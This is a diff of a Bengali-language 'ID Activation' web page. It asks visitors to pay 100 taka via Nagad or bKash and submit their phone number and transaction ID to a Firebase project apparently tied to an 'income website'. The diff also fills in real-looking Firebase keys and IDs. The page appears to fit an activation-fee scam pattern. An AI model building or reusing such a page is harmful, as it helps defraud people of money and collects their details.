@@ -1,33 +1,39 @@
 <!doctype html>
 <html lang="en"> 
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>ID Activation</title> 
-  <link rel="stylesheet" href="style.css"> 
-  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script> 
-  <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"></script> 
- </head> 
- <body> 
-  <div class="popup"> 
-   <h2>ID Activation</h2> 
-   <p>আপনার একাউন্ট অ্যাক্টিভ করতে <b>১০০ টাকা</b> পাঠান এবং নিচে তথ্য পূরণ করুন।</p> 
-   <div class="payment-options"> <button onclick="showNumber('nagad')">নগদ</button> <button onclick="showNumber('bkash')">বিকাশ</button> 
-   </div> 
-   <p id="payment-number" onclick="copyNumber()" style="display: none;"></p> 
-   <input type="text" id="user-number" placeholder="আপনার মোবাইল নাম্বার"> 
-   <input type="text" id="transaction-id" placeholder="ট্রানজেকশন আইডি"> <button id="submit-btn" onclick="submitForm()">Submit</button> 
-   <div id="loading" class="loading-spinner" style="display: none;"></div> 
-  </div> 
-  <script>
-        // 🔹 Firebase Config (তোমার Firebase Console থেকে নিয়ে আসতে হবে)
+<head> 
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>ID Activation</title> 
+    <link rel="stylesheet" href="style.css"> 
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script> 
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"></script> 
+</head> 
+<body> 
+    <div class="popup"> 
+        <h2>ID Activation</h2> 
+        <p>আপনার একাউন্ট অ্যাক্টিভ করতে <b>১০০ টাকা</b> পাঠান এবং নিচে তথ্য পূরণ করুন।</p> 
+        <div class="payment-options"> 
+            <button onclick="showNumber('nagad')">নগদ</button> 
+            <button onclick="showNumber('bkash')">বিকাশ</button> 
+        </div> 
+        <p id="payment-number" onclick="copyNumber()" style="display: none;"></p> 
+        <input type="text" id="user-number" placeholder="আপনার মোবাইল নাম্বার"> 
+        <input type="text" id="transaction-id" placeholder="ট্রানজেকশন আইডি"> 
+        <button id="submit-btn" onclick="submitForm()">Submit</button> 
+        <div id="loading" class="loading-spinner" style="display: none;"></div> 
+    </div> 
+
+    <script>
+        // 🔹 Firebase Config (Firebase Console থেকে নেওয়া সঠিক কনফিগারেশন)
         const firebaseConfig = {
-            apiKey: "AlzaSyAVRUkZh7vPlyJ7RtKtk2lxElZNNPYB7JA",
+            apiKey: "AIzaSyAVRUkZh7vPIyI7RtKkt2lxEIzNNPYB7JA",
             authDomain: "incomewebsite-9032c.firebaseapp.com",
-            projectId: "https://incomewebsite-9032c-default-rtdb.firebaseio.com/",
+            databaseURL: "https://incomewebsite-9032c-default-rtdb.firebaseio.com",
+            projectId: "incomewebsite-9032c",
             storageBucket: "incomewebsite-9032c.appspot.com",
-            messagingSenderId: "তোমার_SENDER_ID",
-            appId: "তোমার_APP_ID"
+            messagingSenderId: "271108120298",
+            appId: "1:271108120298:web:e3c42277f5a604f995c193",
+            measurementId: "G-N2WPDQ6EC5"
         };
 
         // 🔹 Firebase Initializations
@@ -91,7 +97,8 @@
             });
         }
     </script> 
-  <style>
+
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -178,5 +185,6 @@
             100% { transform: rotate(360deg); }
         }
     </style> 
- </body>
-</html>
+
+</body>
+ </html>
